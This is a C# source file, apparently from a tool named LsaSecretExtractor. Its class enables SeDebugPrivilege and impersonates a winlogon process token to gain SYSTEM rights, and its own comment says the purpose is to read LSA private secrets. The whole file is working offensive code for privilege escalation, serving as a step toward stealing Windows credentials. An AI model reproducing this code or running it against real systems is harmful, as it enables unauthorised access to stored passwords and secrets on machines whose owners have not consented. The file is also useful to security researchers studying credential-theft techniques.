using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace LsaSecretExtractor
{
    /// <summary>
    /// Elevates the current thread to SYSTEM by enabling SeDebugPrivilege and
    /// impersonating a winlogon token. Reading LSA private secrets requires SYSTEM.
    /// </summary>
    internal static class SystemImpersonation
    {
        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        private const int SecurityImpersonation = 2;
        private const int TokenImpersonation = 2;

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool RevertToSelf();

        public static bool EnableSeDebugPrivilege()
        {
            IntPtr hToken;
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
                return false;
            try
            {
                LUID luid;
                if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
                    return false;

                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = luid,
                    Attributes = SE_PRIVILEGE_ENABLED
                };
                return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            }
            finally
            {
                CloseHandle(hToken);
            }
        }

        public static bool ImpersonateSystem()
        {
            foreach (Process p in Process.GetProcessesByName("winlogon"))
            {
                IntPtr procHandle;
                try
                {
                    procHandle = p.Handle;
                }
                catch
                {
                    continue;
                }

                IntPtr hProcToken;
                if (!OpenProcessToken(procHandle, TOKEN_DUPLICATE | TOKEN_QUERY, out hProcToken))
                    continue;

                IntPtr hDup;
                bool duplicated = DuplicateTokenEx(hProcToken, TOKEN_QUERY | TOKEN_IMPERSONATE, IntPtr.Zero, SecurityImpersonation, TokenImpersonation, out hDup);
                CloseHandle(hProcToken);
                if (!duplicated)
                    continue;

                bool impersonated = ImpersonateLoggedOnUser(hDup);
                CloseHandle(hDup);

                if (impersonated && IsSystem())
                    return true;

                RevertToSelf();
            }
            return false;
        }

        public static void Revert()
        {
            RevertToSelf();
        }

        public static bool IsSystem()
        {
            return WindowsIdentity.GetCurrent().User.IsWellKnown(WellKnownSidType.LocalSystemSid);
        }

        public static bool IsAdministrator()
        {
            using (WindowsIdentity id = WindowsIdentity.GetCurrent())
            {
                return new WindowsPrincipal(id).IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
    }
}
